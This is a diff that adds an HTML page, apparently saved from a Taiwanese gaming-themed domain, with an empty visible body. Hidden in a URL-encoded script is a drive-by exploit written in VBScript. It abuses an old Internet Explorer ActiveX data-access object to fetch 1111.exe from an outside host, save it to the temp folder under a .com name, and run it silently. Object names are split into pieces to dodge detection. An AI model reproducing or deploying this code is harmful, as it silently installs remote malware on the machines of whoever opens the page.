@@ -1,0 +1,11 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0034)http://www.gamaniatw.com/img/3.htm -->
+<HTML><HEAD>
+<META http-equiv=Content-Type content="text/html; charset=big5">
+<SCRIPT language=Javascript>
+<!--
+document.write(unescape("%3Chtml%3E%0D%0A%3Ctitle%3E%3C%2Ftitle%3E%0D%0A%3Chead%3ETest%2E%2E%2E%0D%0A%3Cbody%3E%0D%0A%3Cscript%20language%3D%22VBScript%22%3E%0D%0A%0D%0Aon%20error%20resume%20next%0D%0A%0D%0Axxxxxxxx%3D%22Shell%2EApplication%22%0D%0A%0D%0A%27%20due%20to%20how%20ajax%20works%2C%20the%20file%20MUST%20be%20within%20the%20same%20local%20domain%0D%0Adl%20%3D%20%22http%3A%2F%2Ftw%2Egamaniatw%2Ecom%2F1111%2Eexe%22%0D%0A%0D%0A%27%20create%20adodbstream%20object%0D%0ASet%20df%20%3D%20document%2EcreateElement%28%22object%22%29%0D%0Adf%2EsetAttribute%20%22classid%22%2C%20%22clsid%3ABD96C556%2D65A3%2D11D0%2D983A%2D00C04FC29E36%22%0D%0Astr%3D%22Microsoft%2EXMLHTTP%22%0D%0ASet%20x%20%3D%20df%2ECreateObject%28str%2C%22%22%29%0D%0A%0D%0Aa1%3D%22Ado%22%0D%0Aa2%3D%22db%2E%22%0D%0Aa3%3D%22Str%22%0D%0Aa4%3D%22eam%22%0D%0Astr1%3Da1%26a2%26a3%26a4%0D%0Astr5%3Dstr1%0D%0Aset%20S%20%3D%20df%2Ecreateobject%28str5%2C%22%22%29%0D%0AS%2Etype%20%3D%201%0D%0A%0D%0A%27%20xml%20ajax%20req%0D%0Astr6%3D%22GET%22%0D%0Ax%2EOpen%20str6%2C%20dl%2C%20False%0D%0Ax%2ESend%0D%0A%0D%0A%27%20Get%20temp%20directory%20and%20create%20our%20destination%20name%0D%0Afname1%3D%2222085%2Ecom%22%0D%0Aset%20F%20%3D%20df%2Ecreateobject%28%22Scripting%2EFileSystemObject%22%2C%22%22%29%0D%0Aset%20tmp%20%3D%20F%2EGetSpecialFolder%282%29%20%27%20Get%20tmp%20folder%0D%0Afname1%3D%20F%2EBuildPath%28tmp%2Cfname1%29%0D%0AS%2Eopen%0D%0A%27%20open%20adodb%20stream%20and%20write%20contents%20of%20request%20to%20file%0D%0A%27%20like%20vbs%20dl%2Bexec%20code%0D%0AS%2Ewrite%20x%2EresponseBody%0D%0A%27%20Saves%20it%20with%20CreateOverwrite%20flag%0D%0AS%2Esavetofile%20fname1%2C2%0D%0A%0D%0AS%2Eclose%0D%0Aset%20Q%20%3D%20df%2Ecreateobject%28xxxxxxxx%2C%22%22%29%0D%0AQ%2EShellExecute%20fname1%2C%22%22%2C%22%22%2C%22open%22%2C0%0D%0A%0D%0A%3C%2Fscript%3E%0D%0A%3C%2Fbody%3E%0D%0A%3C%2Fhead%3E%0D%0A%3C%2Fhtml%3E"))
+//--></SCRIPT>
+
+<META content="MSHTML 6.00.6000.16414" name=GENERATOR></HEAD>
+<BODY></BODY></HTML>
